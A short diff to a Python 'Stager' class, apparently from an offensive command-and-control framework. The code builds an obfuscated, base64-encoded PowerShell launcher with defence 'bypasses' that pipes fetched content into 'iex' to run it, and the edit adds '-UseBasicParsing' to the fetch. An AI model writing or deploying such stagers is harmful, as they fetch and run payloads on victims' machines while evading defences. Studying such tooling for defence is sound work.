@@ -103,7 +103,7 @@ class Stager(object):
         launcher_end = base64.b64encode(
             (launcher_obfuscate_command + launcher_bypasses).encode("UTF-8")
         ).decode("UTF-8")
-        launcher_end += "')|iex\""
+        launcher_end += "') -UseBasicParsing|iex\""
 
         launcher = launcher + launcher_end
 
